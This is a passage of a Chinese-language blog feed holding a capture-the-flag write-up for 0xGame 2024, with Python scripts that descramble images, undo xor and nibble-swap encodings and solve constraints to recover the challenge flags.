class="headerlink" title=""></a></h2><blockquote><p>更新: 2024-11-02 16:58:36<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/cp3xgbk1detxdf74">https://www.yuque.com/chaye-apqbl/vsc85q/cp3xgbk1detxdf74</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/0xGame2024/"/>
    <url>/2026/01/19/WP/2024/0xGame2024/</url>
    
    <content type="html"><![CDATA[<h1 id="0xGame-2024"><a href="#0xGame-2024" class="headerlink" title="0xGame 2024"></a>0xGame 2024</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="base2048"><a href="#base2048" class="headerlink" title="base2048"></a>base2048</h2><p><img src="/./img/od0FslMaB1SW7IBB/1729153577073-82ce4789-d66d-46e6-b481-7004e4b0f5b0-793574.webp" alt="1729153577073-82ce4789-d66d-46e6-b481-7004e4b0f5b0.png"></p><h2 id="一明一暗"><a href="#一明一暗" class="headerlink" title="一明一暗"></a>一明一暗</h2><h2 id="报告哈基米"><a href="#报告哈基米" class="headerlink" title="报告哈基米"></a>报告哈基米</h2><p>长宽一样</p><p><img src="/./img/od0FslMaB1SW7IBB/1729219754928-9bb6e761-5e71-42d4-9b11-6a025866e500-848404.png" alt="1729219754928-9bb6e761-5e71-42d4-9b11-6a025866e500.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729219422264-9504ce79-e161-44bb-86d8-93bd819378df-288402.png" alt="1729219422264-9504ce79-e161-44bb-86d8-93bd819378df.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729219430567-6efe6a19-afe5-41b4-9dcb-61d279cfee24-196327.png" alt="1729219430567-6efe6a19-afe5-41b4-9dcb-61d279cfee24.png"></p><p>zsteg看隐写</p><p><img src="/./img/od0FslMaB1SW7IBB/1729221190200-c1d82b02-8a0e-41ec-9205-08a8989f72a8-085136.png" alt="1729221190200-c1d82b02-8a0e-41ec-9205-08a8989f72a8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plain">from PIL import Image<br><br><br>def arnold(infile: str, outfile: str = None, a: int = 1, b: int = 1, shuffle_times: int = 1,<br>           reverse: bool = False) -&gt; None:<br>    &quot;&quot;&quot;<br>    Arnold猫脸变换函数<br><br>    Parameters:<br>        infile - 输入图像路径<br>        outfile - 输出图像路径<br>        a - Anrold 变换参数<br>        b - Anrold 变换参数<br>        shuffle_times - 置乱次数<br>        reverse - 逆变换<br>    &quot;&quot;&quot;<br>    inimg = Image.open(infile)<br>    width, height = inimg.size<br>    indata = inimg.load()<br>    outimg = Image.new(inimg.mode, inimg.size)<br>    outdata = outimg.load()<br><br>    for _ in range(shuffle_times):<br>        for x in range(width):<br>            for y in range(height):<br>                if reverse:<br>                    nx = ((a * b + 1) * x - a * y) % width<br>                    ny = (y - b * x) % height<br>                else:<br>                    nx = (x + a * y) % width<br>                    ny = (b * x + (a * b + 1) * y) % height<br>                outdata[ny, nx] = indata[y, x]<br><br>    outimg.save(outfile if outfile else &quot;arnold_&quot; + infile, inimg.format)<br><br><br>#arnold(&quot;before.png&quot;, &quot;encode.png&quot;, 9, 39, 1)<br>arnold(&quot;1.png&quot;, &quot;decode.png&quot;, 7, 35, 1, True)<br></code></pre></td></tr></table></figure><p><img src="/./img/od0FslMaB1SW7IBB/1729221293192-81cec015-f4ea-4589-a6da-2a4a7942e4b3-039658.png" alt="1729221293192-81cec015-f4ea-4589-a6da-2a4a7942e4b3.png"></p><p>0xGame{hajimi_i5_</p><p><img src="/./img/od0FslMaB1SW7IBB/1729223301088-fb35ddee-ac94-4fa3-b435-8a1872481dc0-538374.png" alt="1729223301088-fb35ddee-ac94-4fa3-b435-8a1872481dc0.png"></p><p>看到末尾有个zip的反转数据，找一下末尾，然后导出逆向一下</p><p><img src="/./img/od0FslMaB1SW7IBB/1729223370400-117495c5-1652-4ed8-990a-83367bee1821-188103.png" alt="1729223370400-117495c5-1652-4ed8-990a-83367bee1821.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\wangzhanxiazai\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br>def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\wangzhanxiazai\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\wangzhanxiazai\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p>保存为zip文件</p><p><img src="/./img/od0FslMaB1SW7IBB/1729223942190-8d248a45-8dd8-4fae-b42e-8367902518af-717576.png" alt="1729223942190-8d248a45-8dd8-4fae-b42e-8367902518af.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729224309800-424057da-2621-4b59-97f7-59320be86700-893038.png" alt="1729224309800-424057da-2621-4b59-97f7-59320be86700.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729224338523-6a546d58-6e07-4673-9084-213f0d9db700-643875.png" alt="1729224338523-6a546d58-6e07-4673-9084-213f0d9db700.png"></p><p>也有相关的在线网站可以解</p><h3 id="tupperexp"><a href="#tupperexp" class="headerlink" title="tupperexp"></a>tupperexp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import numpy as np<br>import matplotlib.pyplot as plt<br>from PIL import Image<br><br><br>def Tupper_self_referential_formula(k):<br>    aa = np.zeros((17, 106))<br><br>    def f(x, y):<br>        y += k<br>        a1 = 2 ** -(-17 * x - y % 17)<br>        a2 = (y // 17) // a1<br>        return 1 if a2 % 2 &gt; 0.5 else 0<br><br>    for y in range(17):<br>        for x in range(106):<br>            aa[y, x] = f(x, y)<br>    return aa[:, ::-1]<br><br><br>k = 9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252<br><br><br>aa = Tupper_self_referential_formula(k)<br>plt.figure(figsize=(15, 10))<br>plt.imshow(aa, origin=&#x27;lower&#x27;)<br>plt.savefig(&quot;tupper.png&quot;)<br>img = Image.open(&#x27;tupper.png&#x27;)<br># 翻转<br>dst1 = img.transpose(Image.FLIP_LEFT_RIGHT).rotate(180)<br>plt.imshow(dst1)<br>plt.show()<br></code></pre></td></tr></table></figure><p>倒序一下数据再生成照片</p><p><img src="/./img/od0FslMaB1SW7IBB/1729224750548-493fc2ee-d29b-4516-bbee-15a2a4ba4c90-906176.png" alt="1729224750548-493fc2ee-d29b-4516-bbee-15a2a4ba4c90.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729224835166-4b726f7d-cfc4-499f-965e-7b22849313b9-606631.png" alt="1729224835166-4b726f7d-cfc4-499f-965e-7b22849313b9.png"></p><p>倒过来看一下</p><p><img src="/./img/od0FslMaB1SW7IBB/1729224875926-91580a7e-50bc-446b-b08e-7231c15ccfa6-255398.png" alt="1729224875926-91580a7e-50bc-446b-b08e-7231c15ccfa6.png"></p><p>Cute_r1ght?}</p><h2 id="诗人握持"><a href="#诗人握持" class="headerlink" title="诗人握持"></a>诗人握持</h2><p><img src="/./img/od0FslMaB1SW7IBB/1729932113462-2c533823-9a6f-496e-b397-c0c9d16a6db8-271604.png" alt="1729932113462-2c533823-9a6f-496e-b397-c0c9d16a6db8.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="BabyBase"><a href="#BabyBase" class="headerlink" title="BabyBase"></a>BabyBase</h2><p><img src="/./img/od0FslMaB1SW7IBB/1728374302204-3974860f-548e-4a17-9a25-e720f76aa13f-077699.png" alt="1728374302204-3974860f-548e-4a17-9a25-e720f76aa13f.png"></p><h2 id="BinaryMaster"><a href="#BinaryMaster" class="headerlink" title="BinaryMaster"></a>BinaryMaster</h2><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>看汇编把数据打印下来</p><p><img src="/./img/od0FslMaB1SW7IBB/1728526754517-4be555c3-04b0-42e3-92ab-7471b537a0d4-693648.png" alt="1728526754517-4be555c3-04b0-42e3-92ab-7471b537a0d4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[0x7e,0x35,0x0b,0x2a,0x27,0x2c,0x33,0x1f,0x76,0x37,0x1b,0x72,0x31,0x1e,0x36,0x0c,0x4c,0x44,0x63,0x72,0x57,0x49,0x8,0x45,0x42,0x1,0x5a,0x4,0x13,0x4c]<br>for i in range(30):<br>    a[i]^=78-i<br>    print(chr(a[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="Xor-Endian"><a href="#Xor-Endian" class="headerlink" title="Xor-Endian"></a>Xor-Endian</h2><p>后往前读，最高位只有一位时补齐0 </p><p><img src="/./img/od0FslMaB1SW7IBB/1728540961813-b65fa15c-4fe3-4756-a9dc-3d642bed1ba7-493575.png" alt="1728540961813-b65fa15c-4fe3-4756-a9dc-3d642bed1ba7.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">key = &quot;Key0xGame2024&quot;<br>a = [0x7b, 0x1d, 0x3e, 0x51, 0x15, 0x22, 0x1a, 0x0f, 0x56, 0x0a, 0x51, 0x56, 0x00,<br>     0x28, 0x5d, 0x54, 0x07, 0x4b, 0x74, 0x05, 0x40, 0x51, 0x54, 0x08, 0x54,<br>     0x19, 0x72, 0x56, 0x1d, 0x04, 0x55, 0x76, 0x56, 0x0b, 0x54, 0x57, 0x07,<br>     0x0b, 0x55, 0x73, 0x01, 0x4f, 0x08, 0x05]<br><br><br>for i in range(len(a)):<br><br>    a[i] = a[i] ^ ord(key[i % len(key)])  <br>    #if 32 &lt;= a[i] &lt;= 126:  <br>    print(chr(a[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h2><p><img src="/./img/od0FslMaB1SW7IBB/1728791670662-b0daa4ab-2dd3-41ac-b812-d53c146c15fe-369006.png" alt="1728791670662-b0daa4ab-2dd3-41ac-b812-d53c146c15fe.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1728791975266-475acc40-8b28-464b-a4c1-9b650e3e8685-835234.png" alt="1728791975266-475acc40-8b28-464b-a4c1-9b650e3e8685.png"></p><ul><li>这里的逻辑对每个字节执行如下操作：<ul><li><code>*v2 = (16 * *v2) | (*v2 &gt;&gt; 4);</code><ul><li>这个表达式将字节左移 4 位，然后将高 4 位通过右移操作保留并通过 <code>|</code> 操作拼接到低 4 位。</li><li>换句话说，左移使低 4 位变为 0，高 4 位占据低 4 位，然后用原先的高 4 位来填充新生成的高 4 位。</li></ul></li></ul></li><li>该操作对字符串的每个字节都重复，直到遇到 <code>0</code>（字符串结束符或空字节）。</li></ul><p>为了逆向该过程，我们需要恢复原始的字节。给定编码后的字节值，我们可以通过以下操作恢复原始值：</p><ul><li>将编码后的字节右移 4 位，以获取原始字节的高 4 位。</li><li>将编码后的字节进行掩码操作（与 <code>0x0F</code>）保留低 4 位，恢复原始字节的低 4 位。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[<br>    3, 135, 116,  22, 214,  86, 183,  99, 131,  70, <br>  102, 102,  67,  83, 131, 210,  35, 147,  86,  83, <br>  210,  67,  54,  54,   3, 210,  22, 147,  54,  38, <br>  210, 147, 115,  19, 102,  86,  54,  51,  51, 131, <br>   86,  35, 102, 215<br>]<br>for i in range(44):<br>    a[i]=(a[i]&gt;&gt;4 | (a[i]&amp;0x0f)&lt;&lt;4)<br>    print(chr(a[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="Ezjar"><a href="#Ezjar" class="headerlink" title="Ezjar"></a>Ezjar</h2><p><img src="/./img/od0FslMaB1SW7IBB/1728793415951-9c510276-3faf-4fce-8545-67ca8dd759b6-877763.png" alt="1728793415951-9c510276-3faf-4fce-8545-67ca8dd759b6.png"></p><h3 id="求逆元"><a href="#求逆元" class="headerlink" title="求逆元"></a>求逆元</h3><p>5x &#x3D;1mod 16</p><p>16 &#x3D;5*3+1</p><p>5&#x3D;5*1</p><p>1&#x3D;16-5*3</p><p>-3 mod 16&#x3D;13</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">key=&#x27;0123456789abcdef&#x27;<br>a=&#x27;ab50e920-4a97-70d1-b646-cdac5c873376&#x27;<br>inverse=13<br>chang=len(key)<br>for i in range(len(a)):<br>    if(a[i] not in key):<br>        print(a[i],end=&#x27;&#x27;)<br>    else:<br>        suoyin=key.index(a[i])<br>        yuan=key[((suoyin-3+chang)%chang*inverse)%chang]<br>        print(yuan,end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="Ezpyc"><a href="#Ezpyc" class="headerlink" title="Ezpyc"></a>Ezpyc</h2><p><img src="/./img/od0FslMaB1SW7IBB/1728795728290-b5b7e2f7-5928-433a-987e-b3a3cc870431-805931.png" alt="1728795728290-b5b7e2f7-5928-433a-987e-b3a3cc870431.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain"># uncompyle6 version 3.9.1<br># Python bytecode version base 3.8.0 (3413)<br># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]<br># Embedded file name: D:\PortPython3.8.9\App\Python\0xgame\EzPyc.py<br># Compiled at: 2024-09-10 22:18:53<br># Size of source mod 2**32: 519 bytes<br>import hashlib<br>user_input = input(&quot;请输入神秘代号：&quot;)<br>if user_input != &quot;Ciallo~&quot;:<br>    print(&quot;代号不是这个哦&quot;)<br>    exit()<br>input_hash = hashlib.md5(user_input.encode()).hexdigest()<br>print(input_hash)<br>input_hash = list(input_hash)<br><br>for i in range(len(input_hash)):<br>    if ord(input_hash[i]) in range(48, 58):<br>        original_num = int(input_hash[i])<br>        new_num = (original_num + 5) % 10<br>        input_hash[i] = str(new_num)<br>input_hash = &quot;&quot;.join(input_hash)<br>print(&quot;0xGame&#123;&#123;&#123;&#125;&#125;&#125;&quot;.format(input_hash))<br><br># okay decompiling 1.pyc<br></code></pre></td></tr></table></figure><h2 id="Xor-Ramdom"><a href="#Xor-Ramdom" class="headerlink" title="Xor::Ramdom"></a>Xor::Ramdom</h2><p>动态看v21的值 v21是0x7b</p><p><img src="/./img/od0FslMaB1SW7IBB/1729164305260-c3ae8384-cca5-4d41-a9ae-028b3f7ce46c-810269.png" alt="1729164305260-c3ae8384-cca5-4d41-a9ae-028b3f7ce46c.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729164321962-ad9a4217-839b-4054-bfeb-cef447c4b3c4-105454.png" alt="1729164321962-ad9a4217-839b-4054-bfeb-cef447c4b3c4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import random<br>a=[0x0c,0x4f,0x10,0x1f,0x4e, 0x16,0x21,0x12,0x4b,0x24, 0x10,0x4b,0x0a,0x24,0x1f,0x17,0x09,0x4f,0x07,0x08,0x21,0x5c,0x2c,0x1a,0x10,0x1f,0x11,0x16,0x59,0x5a]<br>v23=0<br>v21=0<br>v4=0<br>v5=0<br>random.seed(0x1919810)<br>v21=0x7b<br>for i in range(len(a)):<br>    if(i &amp; 1 !=0):<br>        v8=v21<br>    else:<br>        v8=v21+3<br>    a[i]^=v8<br>for i in range(len(a)):<br>    print(chr(a[i]%256),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="ZZZ"><a href="#ZZZ" class="headerlink" title="ZZZ"></a>ZZZ</h2><p><img src="/./img/od0FslMaB1SW7IBB/1729166172771-1b7aa214-acf0-427e-809a-6dd15afaaf20-478358.png" alt="1729166172771-1b7aa214-acf0-427e-809a-6dd15afaaf20.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729166122551-695bbd52-a50a-40fc-a3b6-240332fb9de8-700035.png" alt="1729166122551-695bbd52-a50a-40fc-a3b6-240332fb9de8.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729264997925-6c145b40-efa7-4e8f-bdee-e93a85301e33-101244.png" alt="1729264997925-6c145b40-efa7-4e8f-bdee-e93a85301e33.png"></p><p>注意开头38*这个数据不是0x，要转化成16进制</p><p><img src="/./img/od0FslMaB1SW7IBB/1729304349422-46a5e60f-437e-4515-bfb4-85a6a1381be4-299229.png" alt="1729304349422-46a5e60f-437e-4515-bfb4-85a6a1381be4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Util.number import long_to_bytes<br>from libnum import n2s<br>from z3 import *<br>v10 = BitVec(&#x27;v10&#x27;, 32)<br>v11 = BitVec(&#x27;v11&#x27;, 32)<br>v12 = BitVec(&#x27;v12&#x27;, 32)<br><br>res=[]<br>solver = Solver()<br>solver.add(11 * v11 + 14 * v10 - v12 == 0x48FB41DDD)<br>solver.add(9 * v10 - 3 * v11 + 4 * v12 == 0x2BA692AD7)<br>solver.add((((v12 - v11)) &gt;&gt; 1) + (v10 ^ 0x87654321) == 3451779756)<br>if solver.check()==sat:<br>    model=solver.model()<br>    res.append(n2s(model[v10].as_long()))<br>    res.append(n2s(model[v11].as_long()))<br>    res.append(n2s(model[v12].as_long()))<br>print(res)<br><br>#0xGame&#123;e544267d-7812-44b3-a35d-d085a85201a4&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/od0FslMaB1SW7IBB/1729304419407-1dc85c9e-9ac0-4c54-8229-1b6bfab4e803-791117.png" alt="1729304419407-1dc85c9e-9ac0-4c54-8229-1b6bfab4e803.png"></p><p>注意最后的结果要倒序过来</p><h2 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h2><p><img src="/./img/od0FslMaB1SW7IBB/1729395902662-788a14be-5d15-4515-8cdf-6228389e88a4-640488.png" alt="1729395902662-788a14be-5d15-4515-8cdf-6228389e88a4.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729395892566-5881f122-b152-43e7-aa94-aa176373947d-234470.png" alt="1729395892566-5881f122-b152-43e7-aa94-aa176373947d.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[20, 92, 43, 69, 81, 73, 95, 23, 72, 22,24,<br>   69, 25, 27, 22, 17, 23, 29, 24, 73<br>    ,17, 24, 85, 27, 112, 76, 15, 92, 24, 1<br>    ,73, 84, 13, 81, 12, 0, 84, 73, 82, 8<br>    ,82, 81, 76, 125]<br>for i in range(44):<br>    if i &lt;=21:<br>        a[i]+=28<br>    if i&gt;21 and i&lt;43:<br>        a[i]^=a[i-22]<br>for i in range(43):<br>    print(chr(a[i]),end=&#x27;&#x27;)<br>b=&#x27;0xGame&#123;3d24a572-394e-4ec7-b9c2-f9097fda1f4a&#125;&#x27;<br>print(len(b))<br></code></pre></td></tr></table></figure><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><p><img src="/./img/od0FslMaB1SW7IBB/1729397568050-494aba5f-7b75-497f-aa92-d62ded6bca06-190756.png" alt="1729397568050-494aba5f-7b75-497f-aa92-d62ded6bca06.png"></p><h2 id="littlepuzzle"><a href="#littlepuzzle" class="headerlink" title="littlepuzzle"></a>littlepuzzle</h2><p>看到数组</p><p>提示密码是48位，所以最后输入的是解出来的数字</p><p><img src="/./img/od0FslMaB1SW7IBB/1729929502771-015b35cb-b440-4d97-9c8e-e390989ca09a-591135.png" alt="1729929502771-015b35cb-b440-4d97-9c8e-e390989ca09a.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729930463569-040282a2-15f7-4d46-b6fc-5a8b40f51f3e-925999.png" alt="1729930463569-040282a2-15f7-4d46-b6fc-5a8b40f51f3e.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729930476309-220d41eb-72dd-4df8-a0f7-12403b3e8aee-772586.png" alt="1729930476309-220d41eb-72dd-4df8-a0f7-12403b3e8aee.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729931620167-5095ccd4-75f3-4a5c-992f-78298b16882d-712271.png" alt="1729931620167-5095ccd4-75f3-4a5c-992f-78298b16882d.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1729931574867-adf72c02-a630-4de4-9919-a7b9cf45e81a-304343.png" alt="1729931574867-adf72c02-a630-4de4-9919-a7b9cf45e81a.png"></p><h2 id="pypro（python-version3-12）"><a href="#pypro（python-version3-12）" class="headerlink" title="pypro（python-version3.12）"></a>pypro（python-version3.12）</h2><p><img src="/./img/od0FslMaB1SW7IBB/1730206348140-e9187c30-843c-4edd-9abf-f3a7e813e201-584973.png" alt="1730206348140-e9187c30-843c-4edd-9abf-f3a7e813e201.png">看到他是3.8以上的pyc，所以用pycdc来反编译</p><p><img src="/./img/od0FslMaB1SW7IBB/1730207450923-80459de4-ea4c-447f-b655-6666e186c470-906671.png" alt="1730207450923-80459de4-ea4c-447f-b655-6666e186c470.png"></p><p>这边不管使用uncompyle6还是pycdc都无法完全编译，使用pycdas查看字节码</p><p><img src="/./img/od0FslMaB1SW7IBB/1730208552292-f244735c-f026-4da4-b6b9-584a4b20b36e-614792.png" alt="1730208552292-f244735c-f026-4da4-b6b9-584a4b20b36e.png"></p><p><img src="/./img/od0FslMaB1SW7IBB/1730209696722-d64b521b-6098-451a-a680-f48503b08a46-259660.png" alt="1730209696722-d64b521b-6098-451a-a680-f48503b08a46.png"></p><p>看到加密的有base64，AES，运算模式是ECB，填充类型是PKCS5</p><h3 id="上饶ctf-逆向-pvm-exe-pycdc-exe-反编译不了全部代码-CSDN博客"><a href="#上饶ctf-逆向-pvm-exe-pycdc-exe-反编译不了全部代码-CSDN博客" class="headerlink" title="上饶ctf 逆向 pvm.exe_pycdc.exe 反编译不了全部代码-CSDN博客"></a><a 